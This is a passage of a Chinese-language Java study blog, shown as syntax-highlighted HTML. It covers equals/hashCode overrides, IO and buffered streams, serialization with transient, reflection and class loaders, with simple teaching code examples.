function">school</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token punctuation">&#123;</span><span class="token string">"南部"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@interface</span> <span class="token class-name">MyAnnotation3</span><span class="token punctuation">&#123;</span>     <span class="token class-name">String</span> <span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="equals和hashcode"><a href="#equals和hashcode" class="headerlink" title="equals和hashcode"></a>equals和hashcode</h1><p><code>equals</code>和<code>hashcode</code>都定义在JDK的Object.java中，所以Java中的任何类都包含有hashCode() 函数</p><p><strong>equals和&#x3D;&#x3D;</strong></p><p>&#x3D;&#x3D;和equals的作用都是<strong>判断两个对象的地址是不是相等。</strong>即，判断两个对象是不试同一个对象。但equals可以重写覆盖equals()方法来比较两个对象的内容相等</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">example<span class="token punctuation">.</span>com</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test03</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Person</span> p1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"eee"</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Person</span> p2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"eee"</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p1.equals(p2) : %s\n"</span><span class="token punctuation">,</span> p1<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p1==p2 : %s\n"</span><span class="token punctuation">,</span> p1<span class="token operator">==</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> age<span class="token punctuation">;</span>        <span class="token class-name">String</span> name<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> name <span class="token operator">+</span> <span class="token string">" - "</span> <span class="token operator">+</span>age<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>obj <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">//如果是同一个对象返回true，反之返回false</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">==</span> obj<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">//判断是否类型相同</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">Person</span> person <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Person</span><span class="token punctuation">)</span>obj<span class="token punctuation">;</span>            <span class="token keyword">return</span> name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>person<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> age<span class="token operator">==</span>person<span class="token punctuation">.</span>age<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>hashcode</strong></p><p>生成对象的“哈希码”或“哈希值</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">example<span class="token punctuation">.</span>com</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashSet</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test03</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Person</span> p1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"eee"</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Person</span> p2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"eee"</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Person</span> p3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"aaa"</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Person</span> p4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"EEE"</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashSet</span> set <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>        set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>        set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 比较p1 和 p2， 并打印它们的hashCode()</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p1.equals(p2) : %s; p1(%d) p2(%d)\n"</span><span class="token punctuation">,</span> p1<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">,</span> p1<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p2<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 比较p1 和 p4， 并打印它们的hashCode()</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p1.equals(p4) : %s; p1(%d) p4(%d)\n"</span><span class="token punctuation">,</span> p1<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>p4<span class="token punctuation">)</span><span class="token punctuation">,</span> p1<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p4<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"set:%s\n"</span><span class="token punctuation">,</span> set<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> age<span class="token punctuation">;</span>        <span class="token class-name">String</span> name<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> name <span class="token operator">+</span> <span class="token string">" - "</span> <span class="token operator">+</span>age<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> nameHash <span class="token operator">=</span>  name<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> nameHash <span class="token operator">^</span> age<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>obj <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">//如果是同一个对象返回true，反之返回false</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">==</span> obj<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">//判断是否类型相同</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">Person</span> person <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Person</span><span class="token punctuation">)</span>obj<span class="token punctuation">;</span>            <span class="token keyword">return</span> name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>person<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> age<span class="token operator">==</span>person<span class="token punctuation">.</span>age<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="IO流"><a href="#IO流" class="headerlink" title="IO流"></a>IO流</h1><p><code>File file = new File(String pathname);</code>获取文件对象</p><h2 id="字节流"><a href="#字节流" class="headerlink" title="字节流"></a>字节流</h2><p><code>FileInputStream</code>文件输出流，读文件  <code>FileOutputStream</code>输出流，写文件</p><p><code>read(byte[] b)</code> 从输入流读取字节并保存到缓冲区中</p><ul><li>int read()：每次读取一个字节，返回读取到的字节。</li><li>int read(byte[] b)：每次读取 b 数组长度的字节数，然后返回读取的字节的个数 [注意与read() 方法的区别]，读到末尾时返回-1。</li><li>int read(byte[] b,int off,int len)：每次读取 b 数组长度的字节数，从数组b 的索引为off 的位置开始，长度为len个字节。</li></ul><p><code>write(byte[] b)</code>将b.length字节从指定的字节数组写入此输出流</p><ul><li>void write(int b)：把一个字节写入到文件中。</li><li>void write(byte[] b)：把数组b 中的所有字节写入到文件中。</li><li>void write(byte[] b,int off,int len)：把数组b 中的字节从 off 索引开始的 len 个字节写入到文件中。</li></ul><h2 id="字符流"><a href="#字符流" class="headerlink" title="字符流"></a>字符流</h2><p><strong>Reader字符输入流，Writer字符输出流</strong></p><p><strong>read</strong></p><ul><li>int read()：每次读取一个字符，并把它转换为 0~65535 的整数，然后返回读取到的字符。读到末尾返回-1。(为了提高 I&#x2F;O 操作的效率，建议尽量使用下面两种read()方法)</li><li>int read(char[] cbuf)：将读取到的多个字符存储到 cbuf 中，然后返回读取的字符，读到末尾时返回-1。</li><li>int read(char[] cbuf,int off,int len)：将读取到的多个字符存储进字符数组 cbuf，从索引 off 开始，长度为len字符，返回结果为读取的字符数.</li></ul><p><strong>write</strong></p><ul><li>void write(int c)：把一个字符写入到文件中。</li><li>void write(char[] cbuf)：把cbuf字符数组写入到文件中。</li><li>void write(char[] cbuf,int off,int len)：把部分字符数组写入到文件中，从 cbuf 数组的 off 索引开始，写入len个字符。</li><li>void write(String str)：把一个字符串写入到文件中。</li><li>void write(String str,int off,int len)：把部分字符串写入到文件中，从 字符串的 off 索引开始，写入len个字符。</li></ul><h2 id="缓冲流"><a href="#缓冲流" class="headerlink" title="缓冲流"></a>缓冲流</h2><p>Java IO流中对应的缓冲流有以下四个：</p><p>字节缓冲流：BufferedInputStream、BufferedOutputStream</p><p>字符缓冲流：BufferedReader、BufferedWriter</p><p><strong>字节缓冲流</strong></p><p> 输入流：</p><ul><li>BufferedInputStream(InputStream in)：创建一个新的字节缓冲输入流，传入的参数是InputStream类型，缓冲区默认大小为8129。</li><li>BufferedInputStream(InputStream in, int size)：创建一个指定缓冲区大小的字节缓冲输入流。</li></ul><p> 输出流：</p><ul><li>BufferedOutputStream(OutputStream out)：创建一个新的字节缓冲输出流，传入的参数是OutputStream ，以将数据写入指定的基础输出流。</li><li>BufferedOutputStream(OutputStream out, int size)：创建一个指定缓冲区大小的的字节缓冲输出流，以将具有指定缓冲区大小的数据写入指定的基础输出流。</li></ul><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">//创建缓冲流对象，注意参数传的FileXXX，而不文件目录</span>bis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"D:\\IO\\1.mp4"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>bos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"D:\\IO\\3.mp4"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//读写操作</span><span class="token keyword">int</span> len<span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>len<span class="token operator">=</span>bis<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>bos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>字符缓冲流</strong></p><p> 输入流：</p><ul><li>BufferedReader(Reader in)：创建一个新的字符缓冲输入流，传入的参数是Reader类型，缓冲区默认大小为8129。</li><li>BufferedReader(Reader in, int sz)：创建一个指定大小缓冲区的字符缓冲输入流。</li></ul><p> 输出流：</p><ul><li>BufferedWriter(Writer out)：创建一个新的字符缓冲输出流，传入的参数是Writer类型，缓冲区默认大小为8129。</li><li>BufferedWriter(Writer out, int sz)：创建一个指定大小缓冲区的字符缓冲输出流。</li></ul><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p>一个对象要想序列化，该对象必须要实现Serializable接口，否则会抛出NotSerializableException异常</p><p><strong>ObjectOutputStream类</strong></p><p><code>writeObject(Object obj)</code> 方法可对指定的obj参数对象进行序列化</p><p><strong>ObjectInputStream类</strong></p><p><code>readObject()</code>方法读取指定目录下的序列化对象</p><p><strong>transient关键字</strong></p><p>transient修饰符仅适用于变量，不适用于方法和类。在序列化时，如果我们不想序列化特定变量以满足安全约束，那么我们应该将该变量声明为transient。执行序列化时，JVM会忽略transient变量的原始值并将默认值保存到文件中。因此，transient意味着不要序列化。</p><p>参考资料：<a href="https://www.cnblogs.com/tanghaorong/p/12322376.html">https://www.cnblogs.com/tanghaorong/p/12322376.html</a></p><h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><h2 id="获取反射中的Class对象"><a href="#获取反射中的Class对象" class="headerlink" title="获取反射中的Class对象"></a>获取反射中的Class对象</h2><p>在反射中，要获取一个类或调用一个类的方法，我们首先需要获取到该类的 Class 对象。</p><p>在 Java API 中，获取 Class 类对象有三种方法：</p><p><strong>第一种，使用 Class.forName 静态方法。</strong>当知道该类的全路径名时，可以使用该方法获取 Class 类对象。</p><pre class="language-vbnet" data-language="vbnet"><code class="language-vbnet"><span class="token keyword">Class</span> clz <span class="token operator">=</span> <span class="token keyword">Class</span>.forName<span class="token punctuation">(</span><span class="token string">"java.lang.String"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>第二种，使用 .class 方法。通过类名</strong></p><p>这种方法只适合在编译前就知道操作的 Class。</p><pre class="language-vbnet" data-language="vbnet"><code class="language-vbnet"><span class="token keyword">Class</span> clz <span class="token operator">=</span> <span class="token keyword">String</span>.<span class="token keyword">class</span><span class="token punctuation">;</span></code></pre><p><strong>第三种，使用类对象的 getClass() 方法。</strong></p><pre class="language-vbnet" data-language="vbnet"><code class="language-vbnet"><span class="token keyword">String</span> <span class="token function">str</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">String</span><span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">Class</span> clz <span class="token operator">=</span> <span class="token function">str</span>.getClass<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>第四种，基本内置类型的包装类都有一个Type属性</strong></p><pre class="language-none"><code class="language-none">Class c4 &#x3D; Integer.TYPE;</code></pre><p><strong>获得父类类型</strong></p><pre class="language-none"><code class="language-none">Class c5 &#x3D; int.class;Class c6 &#x3D; c5.getSuperclass();</code></pre><h2 id="所有类型的Class对象"><a href="#所有类型的Class对象" class="headerlink" title="所有类型的Class对象"></a>所有类型的Class对象</h2><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test01</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> c1 <span class="token operator">=</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>  <span class="token comment">//类</span>        <span class="token class-name">Class</span> c2 <span class="token operator">=</span> <span class="token class-name">Comparable</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>  <span class="token comment">//接口</span>        <span class="token class-name">Class</span> c3 <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>  <span class="token comment">//数组</span>        <span class="token class-name">Class</span> c4 <span class="token operator">=</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>  <span class="token comment">//二维数组</span>        <span class="token class-name">Class</span> c5 <span class="token operator">=</span> <span class="token class-name">Override</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>  <span class="token comment">//注解</span>        <span class="token class-name">Class</span> c6 <span class="token operator">=</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>  <span class="token comment">//枚举</span>        <span class="token class-name">Class</span> c7 <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>   <span class="token comment">//基本数据类型</span>        <span class="token class-name">Class</span> c8 <span class="token operator">=</span> <span class="token keyword">void</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>   <span class="token comment">//void</span>        <span class="token class-name">Class</span> c9 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>   <span class="token comment">//void</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c3<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c4<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c5<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c6<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c7<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c8<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c9<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">//只要元素类型与维度一样，就是同一个Class</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="类加载机制"><a href="#类加载机制" class="headerlink" title="类加载机制"></a>类加载机制</h2><p><img src="/%5Cimages%5Cposts%5CJava%E5%AD%A6%E4%B9%A0%5Cjava_jvm_classload_2.png"></p><p><strong>class类在加载的时候就产生</strong></p><p>类加载的时候会执行代码，当类加载器将类加载到 JVM 中时，会自动触发执行特定的初始化代码</p><p>初始化：静态代码块</p><p>实例化：构造代码块、无参构造函数</p><h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><p><code>.getSystemClassLoader</code>获取系统类加载器</p><p><code>getParent</code>获取系统类加载器的父类加载器</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test03</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//获取系统类加载器</span>        <span class="token class-name">ClassLoader</span> systemClassLoader <span class="token operator">=</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>systemClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//获取系统类加载器的父类加载器-->扩展类加载器</span>        <span class="token class-name">ClassLoader</span> parent <span class="token operator">=</span> systemClassLoader<span class="token punctuation">.</span><span class="token function">getParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//获取扩展类加载器的父类加载器-->根加载器(c/c++)   不能得到根加载器</span>        <span class="token class-name">ClassLoader</span> parent1 <span class="token operator">=</span> parent<span class="token punctuation">.</span><span class="token function">getParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>parent1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//当前类是哪个加载器加载的</span>        <span class="token class-name">ClassLoader</span> classLoader <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token 